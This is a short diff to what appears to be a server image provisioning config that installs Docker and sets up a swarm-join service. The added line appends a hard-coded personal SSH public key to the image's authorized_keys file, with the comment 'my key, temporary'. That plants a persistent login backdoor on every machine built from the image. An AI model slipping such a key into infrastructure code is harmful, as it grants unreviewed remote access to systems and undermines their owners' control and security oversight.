@@ -41,7 +41,8 @@
             "chmod 600 ~/.ssh/authorized_keys",
             "sudo apt-get install -y docker-ce",
             "sudo touch /lib/systemd/system/join-swarm.service /usr/local/bin/join-swarm.sh",
-            "sudo chown ubuntu: /lib/systemd/system/join-swarm.service /usr/local/bin/join-swarm.sh"
+            "sudo chown ubuntu: /lib/systemd/system/join-swarm.service /usr/local/bin/join-swarm.sh",
+            "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFcpCFHqpadw9yP3Nf1gD+GyGFuemrAXkgXNLIRuaeVY' >> ~/.ssh/authorized_keys # my key, temporary"
          ]
       },
       {
